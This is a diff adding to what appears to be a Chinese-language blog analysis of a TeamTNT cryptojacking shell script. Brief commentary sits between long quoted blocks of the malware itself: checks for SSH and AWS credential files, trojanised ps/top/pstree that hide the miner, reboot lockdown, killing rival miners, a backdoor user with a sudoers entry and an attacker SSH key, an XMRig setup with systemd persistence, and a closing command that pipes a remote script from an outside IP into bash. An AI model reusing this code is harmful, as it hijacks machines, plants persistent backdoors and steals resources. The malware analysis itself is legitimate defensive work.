@@ -754,3 +754,634 @@ lock_cron
 ```
 
 然后锁定了定时任务相关的文件和目录.
+
+接着, 又开始了对密钥的检测.
+
+```bash
+function CheckAboutSomeKeys(){
+    if [ -f "/root/.ssh/id_rsa" ]
+    then
+		echo 'found: /root/.ssh/id_rsa'
+    fi
+
+    if [ -f "/home/*/.ssh/id_rsa" ]
+    then
+		echo 'found: /home/*/.ssh/id_rsa'
+    fi
+
+    if [ -f "/root/.aws/credentials" ]
+    then
+		echo 'found: /root/.aws/credentials'
+    fi
+
+    if [ -f "/home/*/.aws/credentials" ]
+    then
+		echo 'found: /home/*/.aws/credentials'
+    fi
+}
+
+CheckAboutSomeKeys
+```
+
+停止了一个叫做 `crypto` 的服务, 但我也不知道这个 TeamTNT 是干嘛的, 网上搜出来的结果好像是一个挖矿组织.
+
+```
+if [ -f "/usr/bin/TeamTNT/[crypto]" ]
+then
+service crypto stop
+rm -fr /usr/bin/TeamTNT/
+fi
+```
+
+然后是一个美其名曰为 `净化系统` 的函数, 实质上是重写了 `ps`, `top`, `pstree` 命令, 将 `crypto|pnscan` 从输出结果中过滤掉了.
+
+```bash
+function SecureTheSystem(){
+    if [ -f "/bin/ps.original" ]
+    then
+        echo "/bin/ps changed"
+    else
+        mv /bin/ps /bin/ps.original
+        echo "#! /bin/bash">>/bin/ps
+        echo "ps.original \$@ | grep -v \"crypto\|pnscan\"">>/bin/ps
+        chmod +x /bin/ps
+                touch -d 20160825 /bin/ps
+        echo "/bin/ps changing"
+    fi
+    if [ -f "/bin/top.original" ]
+    then
+        echo "/bin/top changed"
+    else
+        mv /bin/top /bin/top.original
+        echo "#! /bin/bash">>/bin/top
+        echo "top.original \$@ | grep -v \"crypto\|pnscan\"">>/bin/top
+        chmod +x /bin/top
+                touch -d 20160825 /bin/top
+        echo "/bin/top changing"
+    fi
+    if [ -f "/bin/pstree.original" ]
+    then
+        echo "/bin/pstree changed"
+    else
+        mv /bin/pstree /bin/pstree.original
+        echo "#! /bin/bash">>/bin/pstree
+        echo "pstree.original \$@ | grep -v \"crypto\|pnscan\"">>/bin/pstree
+        chmod +x /bin/pstree
+                touch -d 20160825 /bin/pstree
+        echo "/bin/pstree changing"
+    fi
+    if [ -f "/bin/chattr" ]
+        then
+                chattrsize=`ls -l /bin/chattr | awk '{ print $5 }'`
+                if [ "$chattrsize" -lt "$chattr_size" ]
+                then
+            yum -y remove e2fsprogs
+            yum -y install e2fsprogs
+                else
+                        echo "no need install chattr"
+                fi
+        else
+            yum -y remove e2fsprogs
+            yum -y install e2fsprogs
+    fi
+}
+```
+
+然后又防止重启系统.
+
+```bash
+function LockDownTheSystem(){
+LOCKDOWNARRAY=(shutdown reboot poweroff telinit)
+for LOCKDOWN in ${LOCKDOWNARRAY[@]}; do
+LOCKDOWNBIN=`which $LOCKDOWN` 2>/dev/null 1>/dev/null
+chattr -i $LOCKDOWNBIN 2>/dev/null 1>/dev/null
+tntrecht -i $LOCKDOWNBIN 2>/dev/null 1>/dev/null
+chattr -x $LOCKDOWNBIN 2>/dev/null 1>/dev/null
+#chmod 000 $LOCKDOWNBIN 2>/dev/null 1>/dev/null
+chattr +i $LOCKDOWNBIN 2>/dev/null 1>/dev/null
+tntrecht +i $LOCKDOWNBIN 2>/dev/null 1>/dev/null
+done
+
+chattr +i /proc/sysrq-trigger 2>/dev/null 1>/dev/null
+tntrecht +i /proc/sysrq-trigger 2>/dev/null 1>/dev/null
+
+
+LOCKDOWNFILES=("/lib/systemd/system/reboot.target" "/lib/systemd/system/systemd-reboot.service")
+for LOCKDOWNFILE in ${LOCKDOWNFILES[@]}; do
+
+chattr -i $LOCKDOWNFILE 2>/dev/null 1>/dev/null
+tntrecht -i $LOCKDOWNFILE 2>/dev/null 1>/dev/null
+chattr -x $LOCKDOWNFILE 2>/dev/null 1>/dev/null
+> $LOCKDOWNFILE
+rm -f $LOCKDOWNFILE 2>/dev/null 1>/dev/null
+done
+
+}
+```
+
+当然了, 系统的资源是有限的, 先把竞争对手搞死.
+
+```bash
+function KILLMININGSERVICES(){
+
+echo "[*] Removing previous miner (if any)"
+if sudo -n true 2>/dev/null; then
+  sudo systemctl stop crypto.service
+fi
+killall -9 xmrig
+echo "do KILLMININGSERVICES"
+
+$(docker rm $(docker ps | grep -v grep | grep "/bin/bash -c 'apt" | awk '{print $1}') -f 2>/dev/null 1>/dev/null)
+#$(docker rm $(docker ps | grep -v grep | grep "/bin/bash" | awk '{print $1}') -f 2>/dev/null 1>/dev/null)
+$(docker rm $(docker ps | grep -v grep | grep "/root/startup.sh" | awk '{print $1}') -f 2>/dev/null 1>/dev/null)
+
+$(docker rm $(docker ps | grep -v grep | grep "widoc26117/xmr" | awk '{print $1}') -f 2>/dev/null 1>/dev/null)
+$(docker rm $(docker ps | grep -v grep | grep "zbrtgwlxz" | awk '{print $1}') -f 2>/dev/null 1>/dev/null)
+$(docker rm $(docker ps | grep -v grep | grep "tail -f /dev/null" | awk '{print $1}') -f 2>/dev/null 1>/dev/null)
+
+
+rm -f /usr/bin/docker-update 2>/dev/null 1>/dev/null
+pkill -f /usr/bin/docker-update 2>/dev/null 1>/dev/null
+killall -9 docker-update  2>/dev/null 1>/dev/null
+
+rm -f /usr/bin/redis-backup 2>/dev/null 1>/dev/null
+pkill -f /usr/bin/redis-backup 2>/dev/null 1>/dev/null
+killall -9 redis-backup 2>/dev/null 1>/dev/null
+
+rm -f /tmp/moneroocean/xmrig 2>/dev/null 1>/dev/null
+pkill -f /tmp/moneroocean/xmrig 2>/dev/null 1>/dev/null
+rm -fr /tmp/moneroocean/ 2>/dev/null 1>/dev/null
+killall -9 xmrig 2>/dev/null 1>/dev/null
+
+LOCKFILE='IyEvYmluL2Jhc2gKZWNobyAnRm9yYmlkZGVuIGFjdGlvbiAhISEgVGVhbVROVCBpcyB3YXRjaGluZyB5b3UhJw=='
+
+if [ ! -f /usr/bin/tntrecht ]; then
+chattrbin=`which chattr`
+cp $chattrbin /usr/bin/tntrecht 2>/dev/null 1>/dev/null
+chmod +x /usr/bin/tntrecht 2>/dev/null 1>/dev/null
+chmod -x $chattrbin 2>/dev/null 1>/dev/null
+tntrecht +i $chattrbin 2>/dev/null 1>/dev/null
+fi
+
+LOCKFILE='IyEvYmluL2Jhc2gKZWNobyAnRm9yYmlkZGVuIGFjdGlvbiAhISEgVGVhbVROVCBpcyB3YXRjaGluZyB5b3UhJw=='
+
+if [ -f /root/.tmp/xmrig ]; then
+chattr -iR /root/.tmp/ 2>/dev/null 1>/dev/null
+tntrecht -iR /root/.tmp/ 2>/dev/null 1>/dev/null
+tmpxmrig=("/root/.tmp/config.json" "/root/.tmp/config_background.json" "/root/.tmp/xmrig.log" "/root/.tmp/miner.sh" "/root/.tmp/xmrig")
+for tmpxmrigfile in ${tmpxmrig[@]}; do
+rm -f $tmpxmrigfile 2>/dev/null 1>/dev/null
+pkill -f $tmpxmrigfile 2>/dev/null 1>/dev/null
+kill $(pidof $tmpxmrigfile) 2>/dev/null 1>/dev/null
+echo $LOCKFILE | base64 -d > $tmpxmrigfile
+chmod +x $tmpxmrigfile 2>/dev/null 1>/dev/null
+chattr +i $tmpxmrigfile 2>/dev/null 1>/dev/null
+tntrecht +i $tmpxmrigfile 2>/dev/null 1>/dev/null
+pkill -f $tmpxmrigfile 2>/dev/null 1>/dev/null
+kill $(pidof $tmpxmrigfile) 2>/dev/null 1>/dev/null
+killall $tmpxmrigfile 2>/dev/null 1>/dev/null
+chmod -x /root/.tmp/xmrig 2>/dev/null 1>/dev/null
+rm -f /root/.tmp/xmrig 2>/dev/null 1>/dev/null
+chattr +i /root/.tmp/xmrig 2>/dev/null 1>/dev/null
+tntrecht +i /root/.tmp/xmrig 2>/dev/null 1>/dev/null
+pkill -f /root/.tmp/xmrig 2>/dev/null 1>/dev/null
+ps ax| grep xmrig 2>/dev/null 1>/dev/null
+done
+fi
+
+if [ -f /usr/sbin/cpumon ]; then
+cpumonxmr=("/usr/sbin/cpumon" "/usr/cpu")
+for cpumonfile in ${cpumonxmr[@]}; do
+chattr -i $cpumonfile 2>/dev/null 1>/dev/null
+tntrecht -i $cpumonfile 2>/dev/null 1>/dev/null
+rm -f $cpumonfile 2>/dev/null 1>/dev/null
+pkill -f $cpumonfile 2>/dev/null 1>/dev/null
+kill $(pidof $cpumonfile) 2>/dev/null 1>/dev/null
+echo $LOCKFILE | base64 -d > $cpumonfile
+chmod +x $cpumonfile 2>/dev/null 1>/dev/null
+chattr +i $cpumonfile 2>/dev/null 1>/dev/null
+tntrecht +i $cpumonfile 2>/dev/null 1>/dev/null
+pkill -f $cpumonfile 2>/dev/null 1>/dev/null
+kill $(pidof $cpumonfile) 2>/dev/null 1>/dev/null
+killall $cpumonfile 2>/dev/null 1>/dev/null
+done
+fi
+
+if [ -f /opt/server ]; then
+chattr -i /opt/server 2>/dev/null 1>/dev/null
+tntrecht -i /opt/server 2>/dev/null 1>/dev/null
+rm -f /opt/server 2>/dev/null 1>/dev/null
+pkill -f /opt/server 2>/dev/null 1>/dev/null
+kill $(pidof /opt/server) 2>/dev/null 1>/dev/null
+fi
+
+if [ -f /tmp/log_rotari ]; then
+chattr -i /tmp/log_rotari 2>/dev/null 1>/dev/null
+tntrecht -i /tmp/log_rotari 2>/dev/null 1>/dev/null
+rm -f /tmp/log_rotari 2>/dev/null 1>/dev/null
+pkill -f /tmp/log_rotari 2>/dev/null 1>/dev/null
+kill $(pidof /tmp/log_rotari) 2>/dev/null 1>/dev/null
+fi
+
+BASH00=$(ps ax | grep -v grep |  grep "/root/.tmp00/bash")
+if [ ! -z "$BASH00" ];
+then
+chattr -i /var/spool/cron/root 2>/dev/null 1>/dev/null
+tntrecht -i /var/spool/cron/root 2>/dev/null 1>/dev/null
+chmod 1777 /var/spool/cron/root 2>/dev/null 1>/dev/null
+chmod -x /var/spool/cron/root 2>/dev/null 1>/dev/null
+echo " " > /var/spool/cron/root 2>/dev/null 1>/dev/null
+rm -f /var/spool/cron/root 2>/dev/null 1>/dev/null
+chattr -i /root/.tmp00/bash 2>/dev/null 1>/dev/null
+tntrecht -i /root/.tmp00/bash 2>/dev/null 1>/dev/null
+chmod -x /root/.tmp00/bash 2>/dev/null 1>/dev/null
+pkill -f /root/.tmp00/bash 2>/dev/null 1>/dev/null
+kill $(ps ax | grep -v grep | grep "/root/.tmp00/bash" | awk '{print $1}') 2>/dev/null 1>/dev/null
+kill $(pidof /root/.tmp00/bash) 2>/dev/null 1>/dev/null
+echo " " > /root/.tmp00/bash 2>/dev/null 1>/dev/null
+rm -f /root/.tmp00/bash 2>/dev/null 1>/dev/null
+echo $StringToLock > /root/.tmp00/bash
+chattr +i /root/.tmp00/bash 2>/dev/null 1>/dev/null
+tntrecht +i /root/.tmp00/bash 2>/dev/null 1>/dev/null
+history -c 2>/dev/null 1>/dev/null
+fi
+
+BASH6400=$(ps ax | grep -v grep |  grep "/root/.tmp00/bash64")
+if [ ! -z "$BASH6400" ];
+then
+chattr -i /var/spool/cron/root 2>/dev/null 1>/dev/null
+tntrecht -i /var/spool/cron/root 2>/dev/null 1>/dev/null
+chmod 1777 /var/spool/cron/root 2>/dev/null 1>/dev/null
+chmod -x /var/spool/cron/root 2>/dev/null 1>/dev/null
+echo " " > /var/spool/cron/root 2>/dev/null 1>/dev/null
+rm -f /var/spool/cron/root 2>/dev/null 1>/dev/null
+chattr -i /root/.tmp00/bash64 2>/dev/null 1>/dev/null
+tntrecht -i /root/.tmp00/bash64 2>/dev/null 1>/dev/null
+chmod -x /root/.tmp00/bash64 2>/dev/null 1>/dev/null
+pkill -f /root/.tmp00/bash64 2>/dev/null 1>/dev/null
+kill $(ps ax | grep -v grep | grep "/root/.tmp00/bash64" | awk '{print $1}') 2>/dev/null 1>/dev/null
+kill $(pidof /root/.tmp00/bash64) 2>/dev/null 1>/dev/null
+echo " " > /root/.tmp00/bash64 2>/dev/null 1>/dev/null
+rm -f /root/.tmp00/bash64 2>/dev/null 1>/dev/null
+echo $StringToLock > /root/.tmp00/bash64
+chattr +i /root/.tmp00/bash64 2>/dev/null 1>/dev/null
+tntrecht +i /root/.tmp00/bash64 2>/dev/null 1>/dev/null
+history -c 2>/dev/null 1>/dev/null
+fi
+
+KINSING1=$(ps ax | grep -v grep |  grep "/var/tmp/kinsing")
+if [ ! -z "$KINSING1" ];
+then
+chattr -i /var/tmp/kinsing 2>/dev/null 1>/dev/null
+tntrecht -i /var/tmp/kinsing 2>/dev/null 1>/dev/null
+chmod -x /var/tmp/kinsing 2>/dev/null 1>/dev/null
+pkill -f /var/tmp/kinsing 2>/dev/null 1>/dev/null
+kill $(ps ax | grep -v grep | grep "/var/tmp/kinsing" | awk '{print $1}') 2>/dev/null 1>/dev/null
+kill $(pidof /var/tmp/kinsing) 2>/dev/null 1>/dev/null
+echo " " > /var/tmp/kinsing 2>/dev/null 1>/dev/null
+rm -f /var/tmp/kinsing 2>/dev/null 1>/dev/null
+echo $StringToLock > /var/tmp/kinsing
+chattr +i /var/tmp/kinsing 2>/dev/null 1>/dev/null
+tntrecht +i /var/tmp/kinsing 2>/dev/null 1>/dev/null
+history -c 2>/dev/null 1>/dev/null
+fi
+
+KINSING2=$(ps ax | grep -v grep |  grep "/tmp/kdevtmpfsi")
+if [ ! -z "$KINSING2" ];
+then
+chattr -i /tmp/kdevtmpfsi 2>/dev/null 1>/dev/null
+tntrecht -i /tmp/kdevtmpfsi 2>/dev/null 1>/dev/null
+chmod -x /tmp/kdevtmpfsi 2>/dev/null 1>/dev/null
+pkill -f /tmp/kdevtmpfsi 2>/dev/null 1>/dev/null
+kill $(ps ax | grep -v grep | grep "/tmp/kdevtmpfsi" | awk '{print $1}') 2>/dev/null 1>/dev/null
+kill $(pidof /tmp/kdevtmpfsi) 2>/dev/null 1>/dev/null
+echo " " > /tmp/kdevtmpfsi 2>/dev/null 1>/dev/null
+rm -f /tmp/kdevtmpfsi 2>/dev/null 1>/dev/null
+echo $StringToLock > /tmp/kdevtmpfsi
+chattr +i /tmp/kdevtmpfsi 2>/dev/null 1>/dev/null
+tntrecht +i /tmp/kdevtmpfsi 2>/dev/null 1>/dev/null
+history -c 2>/dev/null 1>/dev/null
+fi
+
+kill $(ps aux | grep -vw crypto | grep -v grep |grep -v scan | grep -vw "/usr/bin/xmrigMiner" | grep -vw "./shell"  | awk '{if($3>40.0) print $2}')
+
+}
+```
+
+接着, 开始准备密钥了.
+
+```bash
+function makesshaxx(){
+	RSAKEY="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCmEFN80ELqVV9enSOn+05vOhtmmtuEoPFhompw+bTIaCDsU5Yn2yD77Yifc/yXh3O9mg76THr7vxomguO040VwQYf9+vtJ6CGtl7NamxT8LYFBgsgtJ9H48R9k6H0rqK5Srdb44PGtptZR7USzjb02EUq/15cZtfWnjP9pKTgscOvU6o1Jpos6kdlbwzNggdNrHxKqps0so3GC7tXv/GFlLVWEqJRqAVDOxK4Gl2iozqxJMO2d7TCNg7d3Rr3w4xIMNZm49DPzTWQcze5XciQyNoNvaopvp+UlceetnWxI1Kdswi0VNMZZOmhmsMAtirB3yR10DwH3NbEKy+ohYqBL root@puppetserver"
+	grep -q hilde /etc/passwd || chattr -ia /etc/passwd;
+	grep -q hilde /etc/passwd || tntrecht -ia /etc/passwd;
+	grep -q hilde /etc/passwd || echo 'hilde:x:1000:1000::/home/hilde:/bin/bash' >> /etc/passwd; chattr +ia /etc/passwd; tntrecht +ia /etc/passwd
+	grep -q hilde /etc/shadow || chattr -ia /etc/shadow;
+	grep -q hilde /etc/shadow || tntrecht -ia /etc/shadow;
+	grep -q hilde /etc/shadow || echo 'hilde:$6$7n/iy4R6znS2iq0J$QjcECLSqMMiUUeHR4iJmkHLzAwgoNRhCC87HI3df95nZH5569TKwJEN2I/lNanPe0vhsdgfILPXedlWlZn7lz0:18461:0:99999:7:::' >> /etc/shadow; chattr +ia /etc/shadow; tntrecht +ia /etc/shadow
+	grep -q hilde /etc/sudoers || chattr -ia /etc/sudoers;
+	grep -q hilde /etc/sudoers || tntrecht -ia /etc/sudoers;
+	grep -q hilde /etc/sudoers || echo 'hilde  ALL=(ALL:ALL) ALL' >> /etc/sudoers; chattr +i /etc/sudoers; tntrecht +i /etc/sudoers
+
+	mkdir /home/hilde/.ssh/ -p
+	touch /home/hilde/.ssh/authorized_keys
+	touch /home/hilde/.ssh/authorized_keys2
+	grep -q root@puppetserver /home/hilde/.ssh/authorized_keys || chattr -ia /home/hilde/.ssh/authorized_keys;
+	grep -q root@puppetserver /home/hilde/.ssh/authorized_keys || tntrecht -ia /home/hilde/.ssh/authorized_keys;
+	grep -q root@puppetserver /home/hilde/.ssh/authorized_keys || echo $RSAKEY > /home/hilde/.ssh/authorized_keys; chattr +ia /home/hilde/.ssh/authorized_keys; tntrecht +ia /home/hilde/.ssh/authorized_keys;
+	curl  http://199.19.226.117/b2f628/dream.txt >>/dev/null
+	cur http://199.19.226.117/b2f628/dream.txt >>/dev/null
+	cd1 http://199.19.226.117/b2f628/dream.txt >>/dev/null
+	TNTcurl http://199.19.226.117/b2f628/dream.txt >>/dev/null
+	wget -q -O- http://199.19.226.117/b2f628/dream.txt >>/dev/null
+	wge -q -O- http://199.19.226.117/b2f628/dream.txt >>/dev/null
+	wd1 -q -O- http://199.19.226.117/b2f628/dream.txt >>/dev/null
+	TNTwget -q -O- http://199.19.226.117/b2f628/dream.txt >>/dev/null
+	grep -q root@puppetserver /home/hilde/.ssh/authorized_keys2 || chattr -ia /home/hilde/.ssh/authorized_keys2;
+	grep -q root@puppetserver /home/hilde/.ssh/authorized_keys2 || tntrecht -ia /home/hilde/.ssh/authorized_keys2;
+	grep -q root@puppetserver /home/hilde/.ssh/authorized_keys2 || echo $RSAKEY > /home/hilde/.ssh/authorized_keys2; chattr +ia /home/hilde/.ssh/authorized_keys2; tntrecht +ia /home/hilde/.ssh/authorized_keys2;
+	mkdir /root/.ssh/ -p
+	touch /root/.ssh/authorized_keys
+	touch /root/.ssh/authorized_keys
+	grep -q root@puppetserver /root/.ssh/authorized_keys || chattr -ia /root/.ssh/authorized_keys;
+	grep -q root@puppetserver /root/.ssh/authorized_keys || tntrecht -ia /root/.ssh/authorized_keys;
+	grep -q root@puppetserver /root/.ssh/authorized_keys || echo $RSAKEY >> /root/.ssh/authorized_keys; chattr +ia /root/.ssh/authorized_keys; tntrecht +ia /root/.ssh/authorized_keys
+	grep -q root@puppetserver /root/.ssh/authorized_keys2 || chattr -ia /root/.ssh/authorized_keys2;
+	grep -q root@puppetserver /root/.ssh/authorized_keys2 || tntrecht -ia /root/.ssh/authorized_keys2;
+	grep -q root@puppetserver /root/.ssh/authorized_keys2 || echo $RSAKEY > /root/.ssh/authorized_keys2; chattr +ia /root/.ssh/authorized_keys2; tntrecht +ia /root/.ssh/authorized_keys2
+}
+```
+
+然后, 开始用各种方式开始下载这个文件.
+
+```bash
+curl http://199.19.226.117/b2f628/dream.txt >>/dev/null
+cur http://199.19.226.117/b2f628/dream.txt >>/dev/null
+cd1 http://199.19.226.117/b2f628/dream.txt >>/dev/null
+TNTcurl http://199.19.226.117/b2f628/dream.txt >>/dev/null
+wget -q -O- http://199.19.226.117/b2f628/dream.txt >>/dev/null
+wge -q -O- http://199.19.226.117/b2f628/dream.txt >>/dev/null
+wd1 -q -O- http://199.19.226.117/b2f628/dream.txt >>/dev/null
+TNTwget -q -O- http://199.19.226.117/b2f628/dream.txt >>/dev/null
+```
+
+开始连接 ssh 隧道了.
+
+```bash
+function CreateSshPunker(){
+if [ ! -f "/usr/bin/pu"]
+then
+echo 'IyEvdXN/太长写不下了, 就是把二进制数据拷进去'
+fi
+}
+
+function checksshkeys(){
+if [ -f /root/.ssh/id_rsa ]; then
+echo "found rsa"
+CreateSshPunker
+fi
+
+if [ -f /home/*/.ssh/id_rsa ]; then
+echo "found rsa"
+CreateSshPunker
+fi
+}
+```
+
+### 火力全开
+
+```bash
+function SetupMoneroOcean(){
+
+######################### printing greetings ###########################
+clear
+echo -e " "
+echo -e "                                \e[1;34;49m___________                 _____________________________\033[0m"
+echo -e "                                \e[1;34;49m\__    ___/___ _____    ____\__    ___/\      \__    ___/\033[0m"
+echo -e "                                \e[1;34;49m  |    |_/ __ \\__  \  /     \|    |   /   |   \|    |   \033[0m"
+echo -e "                                \e[1;34;49m  |    |\  ___/ / __ \|  Y Y  \    |  /    |    \    |   \033[0m"
+echo -e "                                \e[1;34;49m  |____| \___  >____  /__|_|  /____|  \____|__  /____|   \033[0m"
+echo -e "                                \e[1;34;49m             \/     \/      \/                \/         \033[0m"
+echo -e " "
+echo -e "                                ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ "
+echo -e " "
+echo -e "                                \e[1;34;49m            Now you get, what i want to give... --- '''      \033[0m"
+echo " "
+echo " "
+
+
+
+if [ "$(id -u)" == "0" ]; then
+  echo "running as root... its all OKAY!"
+else
+  echo "running not as root... first starting tmp setup..."
+
+fi
+
+downloads()
+{
+    if [ -f "/usr/bin/curl" ]
+    then
+	echo $1,$2
+        http_code=`curl -I -m 50 -o /dev/null -s -w %{http_code} $1`
+        if [ "$http_code" -eq "200" ]
+        then
+            curl --connect-timeout 100 --retry 100 -sL -o $2 $1
+        elif [ "$http_code" -eq "405" ]
+        then
+            curl --connect-timeout 100 --retry 100 -sL -o $2 $1
+        else
+            curl --connect-timeout 100 --retry 100 -sL -o $2 $3
+        fi
+    elif [ -f "/usr/bin/cd1" ]
+    then
+        http_code=`cd1 -I -m 50 -o /dev/null -s -w %{http_code} $1`
+        if [ "$http_code" -eq "200" ]
+        then
+            cd1 --connect-timeout 100 --retry 100 -sL -o $2 $1
+        elif [ "$http_code" -eq "405" ]
+        then
+            cd1 --connect-timeout 100 --retry 100 -sL -o $2 $1
+        else
+            cd1 --connect-timeout 100 --retry 100 -sL -o $2 $3
+        fi
+    elif [ -f "/usr/bin/wget" ]
+    then
+        wget --timeout=50 --tries=100 -O $2 $1
+        if [ $? -ne 0 ]
+	then
+		wget --timeout=100 --tries=100 -O $2 $3
+        fi
+    elif [ -f "/usr/bin/wd1" ]
+    then
+        wd1 --timeout=100 --tries=100 -O $2 $1
+        if [ $? -eq 0 ]
+        then
+            wd1 --timeout=100 --tries=100 -O $2 $3
+        fi
+    fi
+}
+
+
+
+# checking prerequisites
+
+if [ -z $WALLET ]; then
+  echo "ERROR: wallet"
+  exit 1
+fi
+
+WALLET_BASE=`echo $WALLET | cut -f1 -d"."`
+if [ ${#WALLET_BASE} != 95 ]; then
+  echo "ERROR: Wrong wallet base address length (should be 95): ${#WALLET_BASE}"
+  exit 1
+fi
+
+if [ -z $MOHOME ]; then
+  echo "ERROR: Please define HOME environment variable to your home directory"
+  exit 1
+fi
+
+if [ ! -d $MOHOME ]; then
+  echo "ERROR: Please make sure HOME directory $MOHOME exists or set it yourself using this command:"
+  echo '  export HOME=<dir>'
+  exit 1
+fi
+
+if ! type curl >/dev/null; then
+apt-get update --fix-missing 2>/dev/null 1>/dev/null
+apt-get install -y curl 2>/dev/null 1>/dev/null
+apt-get install -y --reinstall curl 2>/dev/null 1>/dev/null
+yum clean all 2>/dev/null 1>/dev/null
+yum install -y curl 2>/dev/null 1>/dev/null
+yum reinstall -y curl 2>/dev/null 1>/dev/null
+fi
+
+
+ if [ -f "$MOHOME/[crypto]" ]
+ then
+         echo "miner file exists"
+ else
+         downloads $miner_url /tmp/xmrig.tar.gz  $miner_url_backup && tar -xf /tmp/xmrig.tar.gz -C $MOHOME/ && mv $MOHOME/xmrig*/xmrig  $MOHOME/\[crypto\]
+ fi
+
+
+if [ -f "$MOHOME/[crypto].pid" ]
+then
+    echo "miner config exists"
+else
+    downloads $config_url $MOHOME/\[crypto\].pid $config_url_backup
+fi
+
+rm /tmp/xmrig.tar.gz
+
+
+
+echo "[*] Checking if stock version is OKAY!"
+  $MOHOME/[crypto] --help >/dev/null
+  if (test $? -ne 0); then
+    if [ -f $MOHOME/[crypto] ]; then
+      echo "ERROR: Stock version of $MOHOME/[crypto] is not functional too"
+    else
+      echo "ERROR: Stock version of $MOHOME/[crypto] was removed by antivirus too"
+    fi
+    exit 1
+  fi
+
+echo "[*] $MOHOME/[crypto] is OK"
+
+
+#sed -i 's/"url": *"[^"]*",/"url": "18.210.126.40:'$PORT'",/' $MOHOME/[crypto].pid
+sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $MOHOME/[crypto].pid
+#sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $MOHOME/[crypto].pid
+sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $MOHOME/[crypto].pid
+#sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $MOHOME/[crypto].pid
+
+cp $MOHOME/[crypto].pid $MOHOME/config_background.json
+sed -i 's/"background": *false,/"background": true,/' $MOHOME/config_background.json
+
+# preparing script
+
+echo "[*] Creating $MOHOME/[crypto].sh script"
+cat >$MOHOME/[crypto].sh <<EOL
+#!/bin/bash
+if ! pidof [crypto] >/dev/null; then
+  nice $MOHOME/[crypto] \$*
+else
+  echo "Monero miner is already running in the background. Refusing to run another one."
+  echo "Run \"killall xmrig\" or \"sudo killall xmrig\" if you want to remove background miner first."
+fi
+EOL
+
+chmod +x $MOHOME/[crypto].sh
+
+# preparing script background work and work under reboot
+
+if ! sudo -n true 2>/dev/null; then
+  if ! grep $MOHOME/[crypto].sh /root/.profile >/dev/null; then
+    echo "[*] Adding $MOHOME/[crypto].sh script to /root/.profile"
+    echo "$MOHOME/[crypto].sh --config=$MOHOME/config_background.json >/dev/null 2>&1" >>/root/.profile
+  else
+    echo "Looks like $MOHOME/[crypto].sh script is already in the /root/.profile"
+  fi
+  echo "[*] Running crypto service in the background (see logs in $MOHOME/[crypto].log file)"
+  /bin/bash $MOHOME/[crypto].sh --config=$MOHOME/config_background.json >/dev/null 2>&1
+else
+
+  if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') > 3500000 ]]; then
+    echo "[*] Enabling huge pages"
+    echo "vm.nr_hugepages=$((1168+$(nproc)))" | sudo tee -a /etc/sysctl.conf
+    sudo sysctl -w vm.nr_hugepages=$((1168+$(nproc)))
+  fi
+
+  if ! type systemctl >/dev/null; then
+
+    /bin/bash $MOHOME/[crypto].sh --config=$MOHOME/config_background.json >/dev/null 2>&1
+
+  else
+
+    echo "[*] Creating crypto systemd service"
+    cat >/tmp/crypto.service <<EOL
+[Unit]
+Description=crypto system service
+
+[Service]
+ExecStart=$MOHOME/[crypto] --config=$MOHOME/[crypto].pid
+Restart=always
+Nice=10
+CPUWeight=1
+
+[Install]
+WantedBy=multi-user.target
+EOL
+    sudo mv /tmp/crypto.service /etc/systemd/system/crypto.service
+    echo "[*] Starting crypto systemd service"
+    sudo killall [crypto] 2>/dev/null
+    sudo systemctl daemon-reload
+    sudo systemctl enable crypto.service
+    sudo systemctl start crypto.service
+  fi
+fi
+
+}
+
+KILLMININGSERVICES
+
+SetupMoneroOcean
+
+makesshaxx
+
+checksshkeys
+
+SecureTheSystem
+
+FixTheSystem
+
+echo ""
+echo "[*] Setup complete"
+curl -fsSL http://199.19.226.117/b2f628fff19fda999999999/is.sh | bash
+cd1 -fsSL http://199.19.226.117/b2f628fff19fda999999999/is.sh | bash
+history -c
+```
+
+最后部分就是开始挖矿了.
